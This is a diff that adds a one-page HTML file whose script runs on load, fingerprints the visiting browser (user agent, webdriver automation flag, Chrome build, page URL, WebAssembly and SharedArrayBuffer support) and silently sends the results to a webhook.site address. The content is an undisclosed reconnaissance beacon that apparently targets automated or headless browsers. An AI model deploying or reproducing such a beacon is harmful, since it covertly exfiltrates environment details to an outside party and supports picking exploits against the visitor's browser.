@@ -1,0 +1,21 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>r</title></head><body>
+<script>
+(async () => {
+  const info = {};
+  try { info.ua = navigator.userAgent; } catch(e) { info.ua = ''+e; }
+  try { info.webdriver = navigator.webdriver; } catch(e) {}
+  try { info.jspi = typeof WebAssembly.Suspending === 'function' && typeof WebAssembly.promising === 'function'; } catch(e) { info.jspi = ''+e; }
+  try { info.jspiS = typeof WebAssembly.Suspending === 'function'; } catch(e) { info.jspiS = ''+e; }
+  try { info.wasmGC = typeof WebAssembly.Function === 'function'; } catch(e) { info.wasmGC = ''+e; }
+  try { info.exn = typeof WebAssembly.Exception === 'function'; } catch(e) { info.exn = ''+e; }
+  try { info.mem64 = (()=>{ try { new WebAssembly.Memory({initial:1, maximum:1, index:'i64'}); return true; } catch(e){ return ''+e; } })(); } catch(e) { info.mem64 = ''+e; }
+  try { info.sab = typeof SharedArrayBuffer !== 'undefined'; } catch(e) {}
+  try { info.promising = !!WebAssembly.promising; } catch(e) { info.promising=''+e; }
+  const m = navigator.userAgent.match(/Chrome\/(\d+)\.(\d+)\.(\d+)\.(\d+)/);
+  info.chrome = m ? m.slice(1).join('.') : 'unknown';
+  info.loc = location.href;
+  try { await fetch('https://webhook.site/5116bd14-ab5f-416b-aba1-0e5640d707e7?d=' + encodeURIComponent(JSON.stringify(info)), {mode:'no-cors'}); } catch(e) {}
+  document.title = JSON.stringify(info);
+  document.body.innerHTML = '<pre style="font-size:6px">' + JSON.stringify(info, null, 1) + '</pre>';
+})();
+</script></body></html>
